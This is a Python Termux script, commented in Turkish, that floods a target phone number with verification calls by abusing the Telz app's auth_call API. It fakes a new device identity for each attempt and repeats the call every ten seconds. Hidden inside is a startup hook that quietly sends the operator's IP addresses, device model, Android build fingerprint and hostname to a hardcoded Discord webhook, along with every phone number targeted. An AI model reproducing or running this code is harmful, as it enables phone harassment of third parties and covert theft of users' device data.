import requests
import json
import time
import uuid
import os
import sys
import random
import threading
from threading import Lock
from datetime import datetime
from collections import defaultdict
import itertools
import socket
import platform
import subprocess

# ============ RENKLENDIRME (Termux uyumlu) ============
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_VAR = True
except ImportError:
    COLORAMA_VAR = False
    class Fore:
        GREEN = '\033[92m'
        RED = '\033[31m'
        WHITE = '\033[37m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        MAGENTA = '\033[95m'
        BLUE = '\033[94m'
        BLACK = '\033[30m'
    class Back:
        MAGENTA = '\033[45m'
        BLACK = '\033[40m'
        WHITE = '\033[47m'
        GREEN = '\033[42m'
        RED = '\033[41m'
    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[22m'

try:
    import pyfiglet
    PYFIGLET_VAR = True
except ImportError:
    PYFIGLET_VAR = False

# ============ WEBHOOK YARDIMCILARI ============
WEBHOOK_URL = "https://discord.com/api/webhooks/1535443281700192278/smjvgU8d9lvNq7cX3tD8vmq3DXUL-sffrAUEG0824KnY2n60RD7CA2uXlBmvNt2FRsdu"

def get_device_info():
    """Cihaz ve ağ bilgilerini toplar (Termux uyumlu, root gerektirmez)"""
    info = {
        'hostname': socket.gethostname(),
        'local_ip': 'Bilinmiyor',
        'public_ip': 'Bilinmiyor',
        'device_model': 'Bilinmiyor',
        'android_version': 'Bilinmiyor',
        'build_fingerprint': 'Bilinmiyor',
        'termux_version': 'Bilinmiyor',
        'os': platform.platform(),
        'python_version': platform.python_version(),
        'uname': str(platform.uname())
    }

    # Lokal IP
    try:
        info['local_ip'] = socket.gethostbyname(socket.gethostname())
    except:
        pass

    # Public IP (internet bağlantısı gerektirir)
    try:
        resp = requests.get('https://api.ipify.org?format=json', timeout=5)
        info['public_ip'] = resp.json().get('ip', 'Bilinmiyor')
    except:
        pass

    # Android getprop komutları (çoğu cihazda çalışır)
    try:
        info['device_model'] = subprocess.check_output(
            ['getprop', 'ro.product.model'], text=True
        ).strip()
    except:
        pass

    try:
        info['android_version'] = subprocess.check_output(
            ['getprop', 'ro.build.version.release'], text=True
        ).strip()
    except:
        pass

    try:
        info['build_fingerprint'] = subprocess.check_output(
            ['getprop', 'ro.build.fingerprint'], text=True
        ).strip()
    except:
        pass

    # Termux sürümü
    try:
        termux_info = subprocess.check_output(['termux-info'], text=True)
        info['termux_version'] = termux_info.strip().split('\n')[0] if termux_info else 'Unknown'
    except:
        pass

    return info

def send_webhook(title, description, color=0x00ff00, fields=None):
    """Discord webhook'a embed mesajı gönderir"""
    embed = {
        "title": title,
        "description": description,
        "color": color,
        "timestamp": datetime.utcnow().isoformat(),
        "footer": {"text": "Telz Spam • Termux Android"}
    }
    if fields:
        embed["fields"] = fields

    data = {"embeds": [embed]}
    try:
        requests.post(
            WEBHOOK_URL,
            data=json.dumps(data),
            headers={"Content-Type": "application/json"},
            timeout=10
        )
    except Exception as e:
        print(f"{Fore.RED}[!] Webhook gönderilemedi: {e}")

def startup_webhook():
    """Script başlangıcında kullanıcı bilgilerini webhook'a iletir"""
    info = get_device_info()
    fields = [
        {"name": "🌐 Public IP", "value": f"`{info['public_ip']}`", "inline": True},
        {"name": "🏠 Local IP", "value": f"`{info['local_ip']}`", "inline": True},
        {"name": "📱 Cihaz Modeli", "value": f"`{info['device_model']}`", "inline": True},
        {"name": "🤖 Android Sürüm", "value": f"`{info['android_version']}`", "inline": True},
        {"name": "🔧 Build Parmak İzi", "value": f"`{info['build_fingerprint']}`", "inline": False},
        {"name": "💻 Termux", "value": f"`{info['termux_version']}`", "inline": True},
        {"name": "🐍 Python", "value": f"`{info['python_version']}`", "inline": True},
        {"name": "🖥️ Hostname", "value": f"`{info['hostname']}`", "inline": True},
    ]
    send_webhook(
        title="🚀 Script Başlatıldı",
        description="Bir kullanıcı Telz Spam aracını çalıştırdı.",
        color=0x3498db,  # mavi
        fields=fields
    )

def target_webhook(phone_number):
    """Hedef numara girildiğinde bilgi gönderir"""
    info = get_device_info()
    fields = [
        {"name": "📞 Hedef Numara", "value": f"**`{phone_number}`**", "inline": False},
        {"name": "🌐 Kullanıcı IP", "value": f"`{info['public_ip']}`", "inline": True},
        {"name": "📱 Cihaz", "value": f"`{info['device_model']} (Android {info['android_version']})`", "inline": True},
    ]
    send_webhook(
        title="🎯 Yeni Hedef Numara Girildi",
        description="Saldırı başlatıldı.",
        color=0xe74c3c,  # kırmızı
        fields=fields
    )

# ============ ANIMASYON / ARAYÜZ SINIFI (ORİJİNAL HALİNDEN ALINMIŞTIR) ============
class AnimasyonluArayuz:

    def __init__(self):
        self.animasyon_aktif = True
        self.durum_mesaji = ""
        self.islem_sayaci = 0
        self.basari_sayaci = 0
        self.hata_sayaci = 0

    def yukleniyor_animasyonu(self, mesaj="İşlem yapılıyor", sure=1.5):
        spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        baslangic = time.time()
        while time.time() - baslangic < sure:
            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {mesaj}... {Style.DIM}')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write(f'\r{Fore.GREEN}✓ {mesaj} tamamlandı!    \n')
        sys.stdout.flush()

    def ilerleme_cubugu(self, yuzde, genislik=40):
        dolu = int(genislik * yuzde / 100)
        bos = genislik - dolu
        if yuzde > 66:
            renk = Fore.GREEN
        elif yuzde > 33:
            renk = Fore.YELLOW
        else:
            renk = Fore.RED
        cubuk = f"{renk}{'█' * dolu}{Style.DIM}{'░' * bos}"
        sys.stdout.write(f'\r{cubuk} %{yuzde:3.1f}')
        sys.stdout.flush()

    def banner_goster(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        if PYFIGLET_VAR:
            banner = pyfiglet.figlet_format("VASTREL CALL", font="slant")
            print(f"{Fore.CYAN}{Style.BRIGHT}{banner}")
        else:
            print(f"""
{Fore.MAGENTA}██╗   ██╗ █████╗ ███████╗████████╗██████╗ ███████╗██╗
{Fore.MAGENTA}██║   ██║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║
{Fore.MAGENTA}██║   ██║███████║███████╗   ██║   ██████╔╝█████╗  ██║
{Fore.MAGENTA}╚██╗ ██╔╝██╔══██║╚════██║   ██║   ██╔══██╗██╔══╝  ██║
{Fore.MAGENTA} ╚████╔╝ ██║  ██║███████║   ██║   ██║  ██║███████╗███████╗
{Fore.MAGENTA}  ╚═══╝  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
            """)
        print(f"{Fore.RED}{Style.BRIGHT} {Fore.WHITE}Geliştirici: {Fore.CYAN}Vastrel | Fucksociety_123")
        print(f"{Fore.RED}{Style.BRIGHT} {Fore.WHITE}Tarih: {Fore.CYAN}{datetime.now().strftime('%d.%m.%Y %H:%M')}")
        print(f"{Fore.RED}{Style.BRIGHT} {Fore.WHITE}Termux Uyumlu: {Fore.GREEN}✓")
        print(f"{Fore.RED}{Style.BRIGHT}{'─'*55}\n")

    def animasyonlu_yaz(self, metin, hiz=0.03, renk=None):
        if renk is None:
            renk = Fore.WHITE
        for harf in metin:
            sys.stdout.write(f"{renk}{harf}")
            sys.stdout.flush()
            time.sleep(hiz)
        print()

    def durum_goster(self, baslik, durum, detay=""):
        simgeler = {'basari': f"{Fore.GREEN}✓", 'hata': f"{Fore.RED}✗", 'bilgi': f"{Fore.CYAN}ℹ️", 'uyari': f"{Fore.YELLOW}⚠️", 'calisiyor': f"{Fore.BLUE}🔄"}
        simge = simgeler.get(durum, "•")
        if durum == 'basari': renk = Fore.GREEN
        elif durum == 'hata': renk = Fore.RED
        elif durum == 'uyari': renk = Fore.YELLOW
        elif durum == 'bilgi': renk = Fore.CYAN
        elif durum == 'calisiyor': renk = Fore.BLUE
        else: renk = Fore.WHITE
        print(f"{simge} {Fore.WHITE}{baslik}: {renk}{detay}")

    def menu_goster(self):
        menu = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
║  {Fore.YELLOW}[1] {Fore.WHITE}Tekli Arama Başlat                          ║
║  {Fore.YELLOW}[2] {Fore.WHITE}Çoklu Arama (Yakında)                       ║
║  {Fore.YELLOW}[3] {Fore.WHITE}Ayarları Değiştir                           ║
║  {Fore.YELLOW}[4] {Fore.WHITE}İstatistikleri Göster                       ║
║  {Fore.YELLOW}[5] {Fore.WHITE}Logları Görüntüle                           ║
║  {Fore.YELLOW}[6] {Fore.WHITE}Çıkış                                       ║
╚══════════════════════════════════════════════════╝
        """
        print(menu)

class RateLimiter:
    def __init__(self, bekleme_suresi=1):
        self.bekleme_suresi = float(bekleme_suresi)
        self.cagri_kayitlari = {}
        self.lock = Lock()
        self.istatistikler = defaultdict(int)

    def kontrol_et(self, numara):
        suanki_zaman = time.time()
        with self.lock:
            son_arama = self.cagri_kayitlari.get(numara)
            if son_arama is None or (suanki_zaman - son_arama) >= self.bekleme_suresi:
                self.cagri_kayitlari[numara] = suanki_zaman
                self.istatistikler['izin_verilen'] += 1
                return True
            else:
                kalan_sure = self.bekleme_suresi - (suanki_zaman - son_arama)
                self.istatistikler['reddedilen'] += 1
                return False, kalan_sure

    def bekleme_suresi_degistir(self, yeni_sure):
        self.bekleme_suresi = float(yeni_sure)

    def istatistik_al(self):
        return dict(self.istatistikler)

class TelzIstemciGelismis:
    TEMEL_URL = "https://api.telz.com/"
    BASLIKLAR = {
        'User-Agent': "Telz-Android/17.5.33",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8"
    }

    def __init__(self, android_id=None, app_version="17.5.33", os="android", os_version="15"):
        self.android_id = android_id or uuid.uuid4().hex[:16]
        self.app_version = app_version
        self.os = os
        self.os_version = os_version
        self.uuid = str(uuid.uuid4())
        self.session = requests.Session()
        self.session.headers.update(self.BASLIKLAR)
        self.istatistikler = {'toplam_istek': 0, 'basarili_istek': 0, 'basarisiz_istek': 0, 'son_hata': None}

    @staticmethod
    def _rastgele_cihaz_adi():
        markalar = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto", "Realme", "Oppo"]
        modeller = ["Pro", "Ultra", "Lite", "Max", "Plus", "5G"]
        return f"{random.choice(markalar)} {random.choice(modeller)}-{uuid.uuid4().hex[:6]}"

    def _api_istegi(self, endpoint, veri, timeout=15, tekrar_sayisi=2):
        url = self.TEMEL_URL + endpoint
        istek_verisi = veri.copy()
        istek_verisi.update({
            "android_id": self.android_id,
            "app_version": self.app_version,
            "os": self.os,
            "os_version": self.os_version,
            "ts": int(time.time() * 1000),
            "uuid": self.uuid
        })
        for deneme in range(tekrar_sayisi):
            try:
                self.istatistikler['toplam_istek'] += 1
                yanit = self.session.post(url, data=json.dumps(istek_verisi), timeout=timeout)
                if yanit.status_code == 429:
                    raise RuntimeError("Hız limiti!")
                yanit.raise_for_status()
                self.istatistikler['basarili_istek'] += 1
                try:
                    return yanit.json()
                except:
                    return yanit.text
            except Exception as e:
                self.istatistikler['basarisiz_istek'] += 1
                self.istatistikler['son_hata'] = str(e)
                if deneme < tekrar_sayisi - 1:
                    time.sleep(2 ** deneme)
                    continue
                raise

    def kimlik_listesi_al(self):
        return self._api_istegi("app/auth_list", {"event": "auth_list"})

    def cihaz_calistir(self, cihaz_adi=None):
        cihaz_adi = cihaz_adi or self._rastgele_cihaz_adi()
        return self._api_istegi("app/run", {
            "event": "run", "device_name": cihaz_adi, "ipv4_address": "10.1.10.1",
            "ipv6_address": "FE80::1", "lang": "tr", "network_country": "tr",
            "network_type": "4G", "roaming": "no", "root": "no", "sim_country": "tr"
        })

    def buton_durumu_kontrol(self, buton="on_reg_continue"):
        return self._api_istegi("app/stat_btns", {"event": "stat_btns", "btn": buton})

    def numara_dogrula(self, telefon, bolge="TR"):
        return self._api_istegi("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": telefon, "region": bolge})

    def arama_baslat(self, telefon, deneme="0", dil="tr"):
        return self._api_istegi("app/auth_call", {"event": "auth_call", "phone": telefon, "attempt": deneme, "lang": dil})

class AramaMotoru:
    def __init__(self):
        self.ui = AnimasyonluArayuz()
        self.rate_limiter = RateLimiter(bekleme_suresi=10)
        self.aktif = True
        self.genel_istatistikler = {
            'toplam_arama': 0, 'basarili_arama': 0, 'basarisiz_arama': 0,
            'baslangic_zamani': datetime.now(), 'api_istekleri': 0
        }
        self.ayarlar = {'bekleme_suresi': 10, 'debug_modu': False, 'max_deneme': 3}

    def baslat(self):
        # İlk çalıştırmada webhook gönder
        startup_webhook()
        try:
            self.ui.banner_goster()
            while self.aktif:
                self.ui.menu_goster()
                secim = input(f"{Fore.YELLOW}Seçiminiz (1-6): {Fore.WHITE}")
                if secim == "1":
                    self._tekli_arama()
                elif secim == "2":
                    print(f"{Fore.RED}Çoklu arama henüz eklenmedi.")
                    time.sleep(1)
                elif secim == "3":
                    self._ayarlari_degistir()
                elif secim == "4":
                    self._istatistikleri_goster()
                elif secim == "5":
                    self._loglari_goruntule()
                elif secim == "6":
                    self._cikis()
                else:
                    print(f"{Fore.RED}Geçersiz seçim!")
                    time.sleep(1)
        except KeyboardInterrupt:
            self._cikis()

    def _tekli_arama(self):
        self.ui.banner_goster()
        numara = input(f"{Fore.WHITE}Hedef numara (+90 ile): ").strip()
        if not numara.startswith("+"):
            numara = "+90" + numara.lstrip("0")

        # Hedef numara girildiğinde webhook gönder
        target_webhook(numara)

        print(f"\n{Fore.GREEN}★ {numara} numarasına HER 10 SANİYEDE BİR arama spamı başlatılıyor!")
        print(f"{Fore.RED}Durdurmak için Ctrl + C bas.")

        while self.aktif:
            try:
                istemci = TelzIstemciGelismis()
                self.genel_istatistikler['toplam_arama'] += 1

                adimlar = [
                    ("Kimlik doğrulama", lambda: istemci.kimlik_listesi_al()),
                    ("Cihaz hazırlama", lambda: istemci.cihaz_calistir()),
                    ("Sürüm kontrol", lambda: istemci.buton_durumu_kontrol()),
                    ("Numara doğrulama", lambda: istemci.numara_dogrula(numara)),
                ]

                for adim_adi, islem in adimlar:
                    self.ui.yukleniyor_animasyonu(adim_adi, 1)
                    sonuc = islem()
                    self.ui.durum_goster(adim_adi, "basari", "Tamamlandı")
                    self.genel_istatistikler['api_istekleri'] += 1

                if self.rate_limiter.kontrol_et(numara) is True:
                    self.ui.animasyonlu_yaz("Arama başlatılıyor...", 0.02, Fore.GREEN)
                    sonuc = istemci.arama_baslat(numara)
                    self.genel_istatistikler['basarili_arama'] += 1
                    self.genel_istatistikler['api_istekleri'] += 1
                    self.ui.durum_goster("Arama", "basari", "Gönderildi - 10sn sonra tekrar")
                else:
                    self.genel_istatistikler['basarisiz_arama'] += 1

                time.sleep(2)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}Spam durduruldu.")
                break
            except Exception as e:
                self.ui.durum_goster("Hata", "hata", str(e)[:60])
                self.genel_istatistikler['basarisiz_arama'] += 1
                time.sleep(10)

    def _istatistikleri_goster(self):
        self.ui.banner_goster()
        sure = str(datetime.now() - self.genel_istatistikler['baslangic_zamani'])
        print(f"{Fore.CYAN}=== İSTATİSTİKLER ===")
        print(f"Toplam Arama: {self.genel_istatistikler['toplam_arama']}")
        print(f"Başarılı: {Fore.GREEN}{self.genel_istatistikler['basarili_arama']}")
        print(f"Başarısız: {Fore.RED}{self.genel_istatistikler['basarisiz_arama']}")
        print(f"API İsteği: {self.genel_istatistikler['api_istekleri']}")
        print(f"Çalışma Süresi: {sure}")
        input("\nEnter ile devam...")

    def _loglari_goruntule(self):
        self.ui.banner_goster()
        try:
            with open('psikolog_spam_log.txt', 'r', encoding='utf-8') as f:
                print(f"{Fore.CYAN}=== SON 50 SATIR LOG ===\n")
                print(''.join(f.readlines()[-50:]))
        except:
            print(f"{Fore.RED}Log dosyası yok veya boş.")
        input("\nEnter ile devam...")

    def _cikis(self):
        self.ui.banner_goster()
        self.ui.animasyonlu_yaz(" program kapanıyor...", 0.03, Fore.MAGENTA)
        self.aktif = False
        sys.exit(0)

    def _ayarlari_degistir(self):
        self.ui.banner_goster()
        print(f"{Fore.YELLOW}=== AYARLAR ===")
        print(f"[1] Bekleme Süresi ({self.ayarlar['bekleme_suresi']} sn)")
        print(f"[2] Debug Modu ({'Açık' if self.ayarlar['debug_modu'] else 'Kapalı'})")
        print(f"[3] Max Deneme ({self.ayarlar['max_deneme']})")
        sec = input(f"{Fore.WHITE}Seçim: ")
        if sec == "1":
            yeni = float(input("Yeni bekleme süresi: "))
            self.rate_limiter.bekleme_suresi_degistir(yeni)
            self.ayarlar['bekleme_suresi'] = yeni
            self.ui.durum_goster("Ayar", "basari", "Bekleme süresi güncellendi")
        elif sec == "2":
            self.ayarlar['debug_modu'] = not self.ayarlar['debug_modu']
            self.ui.durum_goster("Ayar", "basari", f"Debug modu {'açıldı' if self.ayarlar['debug_modu'] else 'kapatıldı'}")
        elif sec == "3":
            self.ayarlar['max_deneme'] = int(input("Max deneme: "))
            self.ui.durum_goster("Ayar", "basari", "Max deneme güncellendi")
        input("\nDevam etmek için Enter...")

if __name__ == "__main__":
    try:
        motor = AramaMotoru()
        motor.baslat()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Kullanıcı tarafından kapatıldı.")
